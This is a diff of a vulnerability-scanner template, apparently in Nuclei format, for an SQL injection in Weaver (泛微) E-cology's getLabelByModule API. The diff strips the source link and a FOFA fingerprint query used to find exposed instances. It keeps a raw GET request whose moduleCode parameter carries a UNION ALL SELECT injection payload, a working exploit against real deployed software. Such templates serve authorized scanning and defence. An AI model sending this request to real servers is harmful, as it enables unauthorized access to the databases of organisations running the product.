@@ -3,12 +3,8 @@ info:
   name: 泛微-API接口moduleCode参数存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/clhbf8fvx2ci01ph'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: clhbf8fvx2ci01ph
-    fofa: app:"E-Weaver"
 http:
 - raw:
   - 'GET /api/ec/dev/locale/getLabelByModule?moduleCode=?moduleCode=?moduleCode=aaa'')+union+all+select+''1,1123123''+-- HTTP/1.1
